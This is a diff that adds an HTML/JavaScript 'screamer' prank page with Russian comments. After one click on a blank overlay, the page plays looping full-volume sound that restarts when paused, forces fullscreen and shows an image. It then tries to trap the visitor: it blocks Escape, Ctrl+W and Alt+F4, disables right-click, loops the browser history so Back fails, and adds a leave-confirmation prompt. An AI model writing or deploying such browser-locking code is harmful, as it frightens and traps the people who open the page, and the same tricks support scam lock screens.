@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Screamer Effect</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background-color: #000;
+        }
+
+        canvas {
+            display: block;
+            width: 100vw;
+            height: 100vh;
+            object-fit: contain;
+            z-index: 1;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #f5f6fa;
+            z-index: 2;
+            cursor: pointer;
+        }
+
+        .overlay.hidden {
+            display: none;
+        }
+
+        audio {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="overlay" class="overlay" onclick="startScreamer()"></div>
+    <canvas id="screamerCanvas"></canvas>
+    <audio id="sound" src="sound.mp3" preload="auto" loop></audio>
+    <script>
+        const canvas = document.getElementById('screamerCanvas');
+        const ctx = canvas.getContext('2d');
+        const sound = document.getElementById('sound');
+        let hasClicked = false;
+
+        // Устанавливаем onbeforeunload сразу
+        window.onbeforeunload = function() {
+            if (hasClicked) {
+                return "Вы уверены, что хотите уйти?";
+            }
+        };
+
+        // Загружаем изображение
+        const img1 = new Image();
+        img1.src = 'image1.jpg';
+
+        img1.onload = () => {
+            canvas.width = img1.width;
+            canvas.height = img1.height;
+            ctx.drawImage(img1, 0, 0, canvas.width, canvas.height);
+        };
+
+        function startScreamer() {
+            hasClicked = true;
+            const overlay = document.getElementById('overlay');
+            overlay.classList.add('hidden');
+
+            // Запуск звука
+            sound.volume = 1.0;
+            sound.loop = true;
+            sound.play();
+            sound.onpause = () => sound.play();
+
+            // Полноэкранный режим
+            const { documentElement } = document;
+            if (documentElement.requestFullscreen) {
+                documentElement.requestFullscreen();
+            } else if (documentElement.mozRequestFullScreen) {
+                documentElement.mozRequestFullScreen();
+            } else if (documentElement.webkitRequestFullscreen) {
+                documentElement.webkitRequestFullscreen();
+            } else if (documentElement.msRequestFullscreen) {
+                documentElement.msRequestFullscreen();
+            }
+
+            // Усложняем закрытие
+            trapUser();
+        }
+
+        function trapUser() {
+            // Блокировка клавиш
+            window.addEventListener('keydown', e => {
+                if (e.key === 'Escape' || e.key === ' ' || (e.ctrlKey && e.key === 'w') || 
+                    (e.altKey && e.key === 'F4')) {
+                    e.preventDefault();
+                }
+            });
+
+            // Блокировка правого клика
+            document.addEventListener('contextmenu', e => {
+                e.preventDefault();
+            });
+
+            // Зацикливание истории
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', () => {
+                history.pushState(null, null, location.href);
+            });
+        }
+    </script>
+</body>
+</html>
